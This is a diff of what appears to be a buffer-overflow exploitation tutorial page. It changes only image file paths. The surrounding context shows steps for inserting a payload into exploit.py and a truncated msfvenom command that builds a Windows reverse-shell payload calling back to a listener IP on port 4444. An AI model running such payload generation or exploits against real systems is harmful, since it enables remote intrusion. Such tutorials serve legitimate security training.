@@ -133,7 +133,7 @@ print()
 
 * Copy the string into the <mark style="color:yellow;">payload</mark> variable in <mark style="color:yellow;">exploit.py</mark>
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>
 
 * I suggest using vim for this part as it will be easier to remove the bad chars in the coming steps
 
@@ -350,7 +350,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
